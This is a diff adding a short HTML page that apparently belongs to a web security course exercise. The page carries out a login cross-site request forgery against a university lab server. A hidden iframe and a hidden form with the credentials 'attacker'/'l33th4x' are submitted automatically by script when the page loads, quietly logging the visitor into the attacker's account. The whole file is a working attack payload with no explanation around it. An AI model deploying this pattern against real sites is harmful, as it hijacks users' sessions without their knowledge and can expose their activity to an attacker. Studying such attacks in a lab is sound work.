@@ -1,0 +1,9 @@
+<iframe name="attacker_page" style="border:1" width=300 height=300 hidden></iframe>
+<form action="http://trurl.cs.illinois.edu/login?csrfdefense=0&xssdefense=5" method="post" target="attacker_page">
+    <input name="username" value="attacker" hidden>
+    <input name="password" value="l33th4x" hidden>
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
